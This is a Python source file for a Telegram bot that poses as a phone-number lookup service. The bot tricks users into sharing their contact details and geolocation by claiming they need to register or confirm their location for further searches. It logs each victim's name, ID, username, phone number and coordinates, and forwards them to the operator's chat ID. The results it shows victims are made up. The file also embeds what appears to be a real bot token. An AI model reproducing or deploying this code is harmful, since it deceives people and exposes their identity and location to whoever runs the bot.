
import telebot
from telebot import types
import time
import random

ID = '1244447431'
bot = telebot.TeleBot("5621751782:AAE1B5k1E60kxL7BbgsAe19VlGWxMZr1ORY")
adr = ['Tverskaya street, 13', 'Prospect of the 60th anniversary of October', 'Vinokurov street', '3rd Golutvinsky lane']
bot.send_message(ID, '!BOT STARTED!') 
print("Bot launched!")

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''👋 Hello! 👋
This is a bot that can show information by phone number!
To search for information, enter the /getinfo''') 
	
@bot.message_handler(commands=['pwngit'])
def start(message):
	bot.send_message(message.chat.id, 'Script author: @pwngit. Channel: @tiivik') 

@bot.message_handler(commands=['getinfo'])
def start(message):
	msg = bot.send_message(message.chat.id, 'Enter any phone number') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		user_input = message.text
		num = user_input.replace('+', '')

		if not num.isdigit():
			msg = bot.reply_to(message, 'It seems you did not enter a valid phone number, please try again by typing /getinfo!')#⏳
			return

		bot.send_message(m_id, f'Request for a number {num} sent!')
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Register", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Looks like you don't have any free requests left for the day!
			To receive additional questions, register in the bot!''', reply_markup=keyboard)
# Отловка ошибок
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Data
			├Name: {first} {last}
			├ID: {userid}
			├Nick: @{nick}
			└Phone number: {phone}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Send your contact!')

	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	button = types.InlineKeyboardButton(text="Advanced Search", callback_data="find")
	keyboardmain.add(button)
	bot.send_message(message.chat.id, f'''
		Room Information
		├Operator: MCI
		└Country: Iran
		''', reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "find":
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="Confirm", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(call.message.chat.id, text='To use the free advanced search, confirm your geolocation!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Геолокация
		├ID: {message.chat.id}
		├Longitude: {lon}
		├Latitude: {lat}
		└Карты: https://www.google.com/maps/place/{lat}+{lon} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, f'''
			Геолокация
			└Адрес: {random.choice(adr)}
			''')
bot.polling()
		